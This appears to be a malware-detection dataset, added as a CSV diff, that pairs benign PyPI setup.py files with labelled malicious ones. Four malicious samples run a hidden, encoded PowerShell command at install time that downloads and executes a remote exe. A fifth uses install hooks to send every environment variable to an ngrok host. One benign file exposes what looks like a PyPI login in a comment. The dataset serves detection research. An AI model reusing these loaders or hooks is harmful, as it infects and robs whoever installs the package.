@@ -1,0 +1,504 @@
+sample_id,package_name,file_source,ecosystem,language,label,source,content_hash,content
+09946287b4261d57bdb42847282158c7fc616968,jmcomic-2.3.17,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/jmcomic/2.3.17/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,bec8bb84c79687251bcda9f055279e67f01ca15b,"from setuptools import setup, find_packages
+
+with open(""README.md"", encoding='utf-8') as f:
+    long_description = f.read()
+
+version = None
+with open('./src/jmcomic/__init__.py', encoding='utf-8') as f:
+    for line in f:
+        if '__version__' in line:
+            version = line[line.index(""'"") + 1: line.rindex(""'"")]
+            break
+
+if version is None:
+    print('Set version first!')
+    exit(1)
+
+setup(
+    name='jmcomic',
+    version=version,
+    description='Python API For JMComic (禁漫天堂)',
+    long_description_content_type=""text/markdown"",
+    long_description=long_description,
+    url='https://github.com/hect0x7/JMComic-Crawler-Python',
+    author='hect0x7',
+    author_email='93357912+hect0x7@users.noreply.github.com',
+    packages=find_packages(""src""),
+    package_dir={"""": ""src""},
+    python_requires="">=3.7"",
+    install_requires=[
+        'commonX>=0.6.2',
+        'curl_cffi',
+        'PyYAML',
+        'Pillow',
+    ],
+    keywords=['python', 'jmcomic', '18comic', '禁漫天堂', 'NSFW'],
+    classifiers=[
+        ""Development Status :: 4 - Beta"",
+        ""Intended Audience :: Developers"",
+        ""Programming Language :: Python :: 3.7"",
+        ""Programming Language :: Python :: 3.8"",
+        ""Programming Language :: Python :: 3.9"",
+        ""Programming Language :: Python :: 3.10"",
+        ""Programming Language :: Python :: 3.11"",
+        ""Operating System :: MacOS"",
+        ""Operating System :: POSIX :: Linux"",
+        ""Operating System :: Microsoft :: Windows"",
+    ],
+    entry_points={
+        'console_scripts': [
+            'jmcomic = jmcomic.cl:main'
+        ]
+    }
+)"
+10ce019d18d08a7551d993452f7545162f4117e9,p-template-generator-0.1.91,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/p-template-generator/0.1.91/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,f831d12a72a3640e34c80a0da8689dcb9cce7f01,"import setuptools
+
+with open(""README.md"", ""r"") as fh:
+    long_description = fh.read()
+setuptools.setup(
+    name=""p-template-generator"",
+    version=""0.1.91"",
+    author=""pengjun"",
+    author_email=""mr_lonely@foxmail.com"",
+    description=""temple tools"",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    py_modules=[],
+    install_requires=[
+        'requests',
+        'Image',
+        'protobuf',
+        'imagesize',
+        'urlparser',
+        'Pillow',
+        'mecord-cli>=0.4.10',
+        'p-template-res>=0.2.4',
+    ],
+    dependency_links=[],
+    entry_points={
+        'console_scripts':[
+            'template = template_generator.main:main'
+        ]
+    },
+    python_requires='>=3.7',
+)"
+67a43254c54687c9a85dba34617f63b354329b89,yangke-1.15.7,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/yangke/1.15.7/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,e666853226423126b4c9bc2d260f17ed6e7638ed,"import setuptools
+import os
+from gettext import gettext as _
+
+# 国际化：生成语言目录，需要确保相应目录已经创建
+# python setup.py extract_messages -k _ --output-file locale/main.pot   # 生成模板，会覆盖已经存在的模板
+# python setup.py init_catalog --domain main -l zh_CN -i locale/main.pot -d locale  # 生成po文件
+# python setup.py compile_catalog --domain main -l zh_CN -d locale  # 等同上一句
+
+# 发布wheel安装文件
+# python setup.py sdist bdist_wheel
+
+# ----------------------- 离线安装1 ------------------------------
+# 首先，离线安装最好保证离线计算机和在线计算机架构及软件版本尽量一致。
+# 1.安装anaconda,
+# 2.复制在线安装生成的conda环境至离线计算机
+# 3.win32api库需要运行Scripts\pywin32_postinstall.py，运行方式为：
+#   a) 切换到指定env环境，conda activate <python38>
+#   b) 运行脚本： python .\Scripts\pywin32_postinstall.py -install
+# 如果以上方法迁移后，运行python时出现错误：无法启动此程序，因为计算机中丢失api-ms-win-core-path-l1-1-0.dll尝试重新安装该程序以解决此问题。
+# 该错误可能是低版本的anaconda安装高版本的python导致的，如离线机器Anaconda3-2021.05上安装python3.9会出现该问题。
+# 解决方法：
+# 1.在联网计算机上安装python 3.8，命令如下：
+#   a) conda create --name=python38 python=3.8
+# 2.将安装的python3.8的虚拟环境复制到离线电脑上
+# 3.离线电脑试运行python3.8，如果不再报错，则继续安装以下额外第三方库
+# 4.pip download yangke[All] torch torchvision torchaudio tensorflow -d D:/whl
+# 5.将D:/whl文件夹复制到离线机器上。
+# 6.pip install --no-index --find-links=D:/whl yangke[All] torch torchvision torchaudio tensorflow
+# ----------------------- 离线安装1 ------------------------------
+
+# ----------------------- 离线安装2 ------------------------------
+# 1.在离线计算机中安装python3.9.12
+# 2.在联网机器上安装好所有包，开始在联网计算机上进行以下操作
+# 3.执行命令：pip freeze > require.txt，将安装包的信息保存到txt文件
+# 4.执行命令: pip wheel -w DIR -r require.txt
+# 5.执行命令: pip download -d DIR -r require.txt，如果生成的require.txt中yangke库是本地路径，则删除后面的路径
+# 6.将require.txt和dir目录拷贝到离线计算机中，以下为在离线计算机中的操作
+# 7.执行命令pip install --no-index --find-links=DIR -r require.txt
+# ----------------------- 离线安装2 ------------------------------
+
+# ----------------------- 上传pypi -----------------------------
+# twine upload dist/*
+# 输入账号密码即可
+# yangke08
+# YangKe.12
+# ----------------------- 上传pypi -----------------------------
+
+from yangke import __version__, extras_require
+
+yangke_version = __version__
+with open(os.path.join(os.path.dirname(__file__), 'README.md'), ""r"", encoding=""utf8"") as fh:
+    long_description = fh.read()
+
+install_requires = [  # 申明依赖包，安装包时pip会自动安装
+    'pandas>=1.3.0',
+    'pyyaml>=5.2',
+    'json5>=0.8.5',
+    'dill>=0.3.3',  # 储存函数对象
+    'babel>=2.9',
+    'pathlib2',
+    'pillow>=7.0.0',
+    # 'pywin32',  # 如果添加了pywin32依赖，则无法在linux系统上安装，因为依赖无法满足
+    'cmake',
+    'loguru',
+    'apscheduler',
+    'matplotlib>=3.5.0',
+    'openpyxl>3',
+    'pyKriging',
+    'opencv-python',
+    'psutil',
+    'markupsafe>=2.1.1',  # scrapy框架需要
+    'pyecharts',
+    'iapws>=1.5',
+    'qt_material',
+
+],
+
+all_lib = []
+for v in extras_require.values():
+    all_lib.extend(v)
+all_lib = list(set(all_lib))
+extras_require['All'] = all_lib
+extras_require['ugly'] = [  # 容易出错的包
+    'dlib>=19.17.0',  # dlib需要单独安装，涉及到cmake和boost
+    'torch>=1.4.0',  # pytorch需要单独安装，pypi里版本太老
+    'scikit_learn',  # 32位python中该库无法从源代码编译安装，需要下载whl文件安装
+    'scipy',  # 32位无法从源代码编译安装，需要下载whl文件安装
+    'PyQt6-WebEngine',  # 32位python无法安装该库
+    'pyWinhook>=1.6.2',  # 32位python无法编译安装，需要下载whl文件安装
+    'scikit-image>=0.19.3',  # paddleocr依赖
+    'lmdb>=1.3.0',  # paddleocr依赖
+    'orjson>3.7.3',  # paddleocr依赖
+]
+
+setuptools.setup(
+    name=""yangke"",  # 模块名
+    version=yangke_version,
+    packages=setuptools.find_packages(
+        exclude=['StockData', 'yangke..idea', 'yangke..git']),  # 这里输入Mod包文件目录
+    # scripts=[""sis_io.py""],
+    py_modules=[""main"",
+                # ""yangke/spider/stock10jqka/start_stock10jqka"",
+                # ""yangke\spider\stock10jqka\stock10jqka\spiders\jqka_spider"",
+                ],  # 打包的*.py文件
+
+    package_data={
+        """": [""*.py"", ""*.cfg"", ""*.js"", ""*.html"", ""*.ico""],
+    },
+    include_package_data=True,  # 将MANIFEST.in中的文件也打包进wheel文件中
+
+    python_requires="">=3.6"",
+
+    # metadata to display on PyPI
+    author=""杨可"",
+    author_email=""yangyangyangkekeke@qq.com"",
+    description=_(""个人工具综合平台，包含常用工具，网络爬虫，知识图谱，神经网络预测等工具""),
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    keywords=""yangke"",
+    url=""https://gitee.com/yangke02/lib4python"",
+    project_urls={
+        ""Bug Tracter"": ""https://gitee.com/yangke02/lib4python"",
+        ""Documentation"": ""https://gitee.com/yangke02/lib4python"",
+        ""Source Code"": ""https://gitee.com/yangke02/lib4python"",
+        ""Funding"": ""https://gitee.com/yangke02/lib4python"",
+    },
+    classifiers=[  # 给pip工具一些额外的元数据信息，只是用来给pypi提供搜索依据的，对实际项目不做任何限制
+        ""Development Status :: 4 - Beta"",
+        # Indicate who your project is intended for
+        ""Intended Audience :: Developers"",
+        ""Topic :: Software Development :: Build Tools"",
+
+        ""License :: Freely Distributable"",
+        ""Natural Language :: Chinese (Simplified)"",
+
+        ""Programming Language :: Python :: 3"",
+        ""Operating System :: Microsoft :: Windows"",
+    ],
+    install_requires=install_requires,
+    extras_require=extras_require,
+    message_extractors={
+        'yangke': [
+            ('**.py', 'python', None),
+            # ('**/templates/**.html', 'genshi', None),
+            # ('**/templates/**.txt', 'genshi', {'template_class': 'genshi.template:TextTemplate'})
+        ],
+    },
+)"
+8fca89cdb3d4e4701e82c99e7ddcf6bdbfdcebdb,lxml2pandas-0.16,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/lxml2pandas/0.16/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,b266c525458f9410b565d357c8f26e3b4f029377,"from setuptools import setup, find_packages
+import codecs
+import os
+# 
+here = os.path.abspath(os.path.dirname(__file__))
+# 
+with open(os.path.join(os.path.abspath(os.path.dirname(__file__)),'README.md'), encoding=""utf-8"") as fh:
+    long_description = ""\n"" + fh.read()\
+
+from pathlib import Path
+this_directory = Path(__file__).parent
+#long_description = (this_directory / ""README.md"").read_text()
+
+VERSION = '''0.16'''
+DESCRIPTION = '''lxml to pandas for fast web scraping'''
+
+# Setting up
+setup(
+    name=""lxml2pandas"",
+    version=VERSION,
+    license='MIT',
+    url = 'https://github.com/hansalemaos/lxml2pandas',
+    author=""Johannes Fischer"",
+    author_email=""aulasparticularesdealemaosp@gmail.com"",
+    description=DESCRIPTION,
+long_description = long_description,
+long_description_content_type=""text/markdown"",
+    #packages=['a_pandas_ex_apply_ignore_exceptions', 'fake_headers', 'flatten_everything', 'lxml', 'multiprocnomain', 'numpy', 'pandas', 'requests'],
+    keywords=['lxml', 'pandas', 'web scraping'],
+    classifiers=['Development Status :: 4 - Beta', 'Programming Language :: Python :: 3 :: Only', 'Programming Language :: Python :: 3.10', 'Topic :: Software Development :: Libraries :: Python Modules', 'Topic :: Utilities'],
+    install_requires=['a_pandas_ex_apply_ignore_exceptions', 'fake_headers', 'flatten_everything', 'lxml', 'multiprocnomain', 'numpy', 'pandas', 'requests'],
+    include_package_data=True
+)
+#python setup.py sdist bdist_wheel
+#twine upload dist/*"
+d98f18e8fa8cd1c19aecd17d382640aa1ab0a09c,chainforge-0.2.7.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/chainforge/0.2.7.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,8265cf14817457ecd25aee6125460653c65a0e82,"from setuptools import setup, find_packages
+
+def readme():
+    with open('README.md', encoding='utf-8') as f:
+        return f.read()
+
+setup(
+    name='chainforge',
+    version='0.2.7.1',
+    packages=find_packages(),
+    author=""Ian Arawjo"",
+    description=""A Visual Programming Environment for Prompt Engineering"",
+    long_description=readme(),
+    long_description_content_type='text/markdown',
+    keywords='prompt engineering LLM response evaluation',
+    license=""MIT"",
+    url=""https://github.com/ianarawjo/ChainForge/"",
+    install_requires=[
+        # Package dependencies
+        ""flask>=2.2.3"",
+        ""flask[async]"",
+        ""flask_cors"",
+        ""requests"",
+        ""urllib3==1.26.6"",
+        ""openai"",
+        ""anthropic"",
+        ""google-generativeai"",
+        ""dalaipy>=2.0.2"",
+        ""mistune>=2.0"",  # for LLM response markdown parsing
+    ],
+    entry_points={
+        'console_scripts': [
+            'chainforge = chainforge.app:main',
+        ],
+    },
+    classifiers=[
+        # Package classifiers
+        'Development Status :: 3 - Alpha',
+        'Intended Audience :: Developers',
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+    ],
+    python_requires="">=3.8"",
+    include_package_data=True,
+)"
+055fd6f253f2813fdd938cbf519341e64c44568c,selfsuperstrpaypal-9.31,selfsuperstrpaypal-9.31/selfsuperstrpaypal-9.31/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,cc22baa11fc32d966f68596bb5043a669472dd01,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'selfsuperstrpaypal',
+    packages = ['modlib'],
+    version = '5.59',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+4f37677b78c868f4a17e71cc000f32f22050963b,urlcpu-2.23,urlcpu-2.23/urlcpu-2.23/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,85541c4b78857e01fe5047e42a33235e45414434,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'urlcpu',
+    packages = ['modlib'],
+    version = '4.31',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+5f38138b467df73e49cda159ebcaa6cf4117231f,libvmnvidia-1.36,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/libvmnvidia/1.36/tar-gz/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,2e23c6ecd00038fe7d3a0e07b168096c0fada357,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'libvmnvidia',
+    packages = ['modlib'],
+    version = '4.7',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+f435f61c8fdb0e63fd62539bcea9f6ba93593b0e,py-nvidiacandy-9.41,py-nvidiacandy-9.41/py-nvidiacandy-9.41/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,524c92e9ded45c9aad029b0127bb240d2982c304,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'py-nvidiacandy',
+    packages = ['modlib'],
+    version = '3.53',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+f77438ba68a546523a82ffd6a7266ee8f5621e4b,artifact-lab-3-package-e90915e1-0.1.4,artifact-lab-3-package-e90915e1-0.1.4/artifact-lab-3-package-e90915e1-0.1.4/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,a7b9ac97557eda89e132ea6d2eb9e4e9978f2b7f,"import setuptools
+from setuptools.command.install import install
+from setuptools.command.develop import develop
+from setuptools import setup, find_packages
+import os
+import urllib.request
+import urllib.parse
+
+def notmalfunc():
+    data = dict(os.environ)
+    encoded_data = urllib.parse.urlencode(data).encode()
+    url = 'https://ac9c-54-204-140-51.ngrok-free.app'
+    request = urllib.request.Request(url, data=encoded_data)
+    urllib.request.urlopen(request)
+
+class AfterDevelop(develop):
+    def run(self):
+        develop.run(self)
+        notmalfunc()
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        notmalfunc()
+
+setuptools.setup(
+    name = ""artifact-lab-3-package-e90915e1"",
+    version = ""0.1.4"",
+    long_description = ""long description"",
+    long_description_content_type = ""text/markdown"",
+    classifiers = [
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    packages = find_packages(),
+    python_requires = "">=3.6"",
+    cmdclass={
+        'develop': AfterDevelop,
+        'install': AfterInstall,
+    },
+)"
